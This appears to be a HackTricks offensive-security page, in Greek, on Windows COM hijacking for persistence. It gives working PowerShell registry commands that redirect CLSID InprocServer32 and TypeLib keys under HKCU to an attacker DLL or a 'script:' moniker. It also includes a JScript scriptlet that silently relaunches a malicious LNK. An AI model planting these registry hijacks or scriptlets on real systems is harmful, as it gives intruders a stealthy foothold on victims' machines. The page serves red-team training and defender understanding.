# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζήτηση μη υπαρχόντων COM συστατικών

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί για επίμονη παρουσία. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρείτε αναζητούμενα κλειδιά μητρώου COM που δεν υπάρχουν και που ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να παραμείνει. Φίλτρα:

- **RegOpenKey** λειτουργίες.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει με **InprocServer32**.

Μόλις αποφασίσετε ποιο μη υπάρχον COM θα μιμηθείτε, εκτελέστε τις ακόλουθες εντολές. _Προσοχή εάν αποφασίσετε να μιμηθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### COM components του Task Scheduler που μπορούν να ανακαταληφθούν

Τα Windows Tasks χρησιμοποιούν Custom Triggers για να καλέσουν COM objects και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψει κανείς πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ελέγχοντας την έξοδο μπορείτε να επιλέξετε για παράδειγμα ένα που θα εκτελείται **κάθε φορά που ένας χρήστης συνδέεται**.

Τώρα, αν αναζητήσετε το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID** και στο HKLM και στο HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Τότε, μπορείτε απλά να δημιουργήσετε την εγγραφή HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.

---

## COM TypeLib Hijacking (script: moniker persistence)

Οι Type Libraries (TypeLib) ορίζουν COM interfaces και φορτώνονται μέσω της `LoadTypeLib()`. Όταν ένας COM server δημιουργείται, το λειτουργικό σύστημα (OS) μπορεί επίσης να φορτώσει την συνδεδεμένη TypeLib συμβουλευόμενο τα registry keys κάτω από `HKCR\TypeLib\{LIBID}`. Αν το μονοπάτι της TypeLib αντικατασταθεί με έναν **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν επιλυθεί η TypeLib — δημιουργώντας μια stealthy persistence που ενεργοποιείται όταν αγγίζονται κοινά components.

Αυτό έχει παρατηρηθεί εναντίον του Microsoft Web Browser control (συχνά φορτώνεται από Internet Explorer, εφαρμογές που ενσωματώνουν WebBrowser, και ακόμη και `explorer.exe`).

### Steps (PowerShell)

1) Εντοπίστε το TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που συχνά καταχράζονται από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Κατευθύνετε το per-user TypeLib path σε ένα τοπικό scriptlet χρησιμοποιώντας το μονίκερ `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop μια ελάχιστη JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιήθηκε από την αρχική αλυσίδα):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control, ή ακόμη και μια καθημερινή δραστηριότητα του Explorer, θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά το logon/reboot.

Καθαρισμός
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα υψηλής συχνότητας συστατικά COM· να επιλύετε πάντα πρώτα το πραγματικό `LIBID` από `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να γεμίσετε το υποκλειδί `win64` για καταναλωτές 64-bit.

## Αναφορές

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
